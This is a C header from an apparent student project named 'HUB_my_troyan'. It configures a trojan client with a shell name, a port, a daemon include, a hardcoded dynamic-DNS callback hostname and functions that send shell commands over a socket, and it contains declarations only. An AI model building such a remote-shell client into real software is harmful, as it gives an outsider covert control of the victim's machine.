/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 29/04/2021 client.h
*/

#ifndef CLIENT_H
#define CLIENT_H

#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "daemon.h"
#include "socket.h"
#include "utility.h"
#include "client_t.h"

/// MACRO
#define EXIT_QUIT 21
#define LOGOUT_CMD "exit"

/// CONFIG
#define SHELL_NAME "bash"
#define IP "127.0.0.1"
#define HOSTNAME "racaud.ddns.net"
#define CONNECTION_MODE IP_MODE
#define PORT 12301
#define LOGGER_ENABLE true

typedef enum connection_mode {
    IP_MODE,
    HOSTNAME_MODE
} connection_mode_e;

/// SHELL
int shell_client_init(socket_t *client, shell_t *shell);
void shell_stop(shell_t *shell);
int send_shell_command(shell_t *shell, const char *command);

/// CLIENT
int client(void);

#endif // CLIENT_H
